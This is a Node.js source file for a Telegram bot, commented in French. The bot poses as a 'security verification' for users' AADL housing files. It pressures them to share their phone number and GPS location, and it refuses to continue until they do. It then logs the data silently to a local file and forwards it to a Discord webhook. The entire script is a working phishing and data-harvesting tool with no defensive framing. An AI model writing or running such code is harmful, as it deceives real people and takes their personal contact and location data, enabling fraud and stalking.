require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const https = require('https');

// Récupérer le token du fichier .env
const token = process.env.LOGGER_BOT_TOKEN;
const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL;

// Vérifier si le token est configuré
if (!token || token === 'YOUR_LOGGER_BOT_TOKEN_HERE') {
  console.error('⛔ Erreur: Vous devez configurer votre LOGGER_BOT_TOKEN dans le fichier .env');
  console.log('   Créez un nouveau bot via @BotFather sur Telegram pour obtenir ce token.');
  process.exit(1);
}

// Initialiser le bot Logger
const bot = new TelegramBot(token, { polling: true });

// Fonction pour envoyer des alertes vers Discord
function sendToDiscord(message) {
  if (!discordWebhookUrl || discordWebhookUrl === 'YOUR_DISCORD_WEBHOOK_URL_HERE') return;

  const data = JSON.stringify({
    content: `🛡️ **[SÉCURITÉ LOGGER]**\n${message}`
  });

  const url = new URL(discordWebhookUrl);
  const options = {
    hostname: url.hostname,
    path: url.pathname + url.search,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };

  const req = https.request(options, (res) => {
    res.on('data', () => {});
  });

  req.on('error', (error) => {
    console.error('Erreur Discord Logger:', error.message);
  });

  req.write(data);
  req.end();
}

// Fonction pour enregistrer les données en toute sécurité
function logSecurityData(userId, username, data) {
  const logEntry = {
    timestamp: new Date().toISOString(),
    userId: userId,
    username: username || 'Unknown',
    data: data
  };

  const logFile = 'security_logs.json';
  let logs = [];

  // Lire les anciens logs si le fichier existe
  if (fs.existsSync(logFile)) {
    const fileContent = fs.readFileSync(logFile);
    logs = JSON.parse(fileContent);
  }

  // Ajouter la nouvelle entrée
  logs.push(logEntry);

  // Sauvegarder dans le fichier
  fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
  console.log(`🔒 [ALERTE SÉCURITÉ] Nouvelles coordonnées enregistrées pour l'utilisateur @${username} (ID: ${userId})`);
  
  // Alerte Discord
  sendToDiscord(`🚨 **Nouveau Log de Sécurité**\nUtilisateur: @${username || 'Inconnu'} (ID: ${userId})\nDonnées: ${JSON.stringify(data)}`);
}

console.log('🛡️ Logger Bot (Sécurité) en cours de démarrage...');

// Gérer la commande /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  
  // Options de clavier spécial pour demander des informations sensibles
  const opts = {
    reply_markup: {
      keyboard: [
        [
          { text: "📱 Partager mon numéro de téléphone", request_contact: true }
        ],
        [
          { text: "📍 Partager ma localisation GSP", request_location: true }
        ]
      ],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  };

  const welcomeMessage = `
⚠️ Procédure de vérification de sécurité requise.

Pour des raisons de sécurité liées à votre dossier AADL, veuillez confirmer votre identité en partageant vos coordonnées ci-dessous :
  `;
  
  bot.sendMessage(chatId, welcomeMessage, opts);
});

// Gérer la réception des contacts (numéro de téléphone)
bot.on('contact', (msg) => {
  const chatId = msg.chat.id;
  const contact = msg.contact;
  const username = msg.from.username;
  
  // Enregistrer silencieusement les données
  logSecurityData(chatId, username, { 
    type: 'CONTACT_PHONE', 
    phoneNumber: contact.phone_number,
    firstName: contact.first_name,
    lastName: contact.last_name || ''
  });

  bot.sendMessage(chatId, "✅ Vérification téléphonique réussie. Vos données sont sécurisées.", {
    reply_markup: { remove_keyboard: true } // Enlever le clavier après réception
  });
});

// Gérer la réception des localisations (GPS)
bot.on('location', (msg) => {
  const chatId = msg.chat.id;
  const location = msg.location;
  const username = msg.from.username;
  
  // Enregistrer silencieusement les données
  logSecurityData(chatId, username, { 
    type: 'GPS_LOCATION', 
    latitude: location.latitude,
    longitude: location.longitude
  });

  bot.sendMessage(chatId, "✅ Localisation confirmée. Mode sécurisé activé.", {
    reply_markup: { remove_keyboard: true }
  });
});

// Gérer les messages texte normaux (si l'utilisateur refuse de cliquer sur les boutons)
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  
  // Si ce n'est ni un contact, ni une localisation, ni une commande start
  if (!msg.contact && !msg.location && msg.text !== '/start') {
    bot.sendMessage(chatId, "❌ Action refusée. Vous devez utiliser les boutons ci-dessous pour partager vos coordonnées afin de continuer la procédure.");
  }
});

console.log('✅ Logger Bot connecté. En attente de coordonées...');
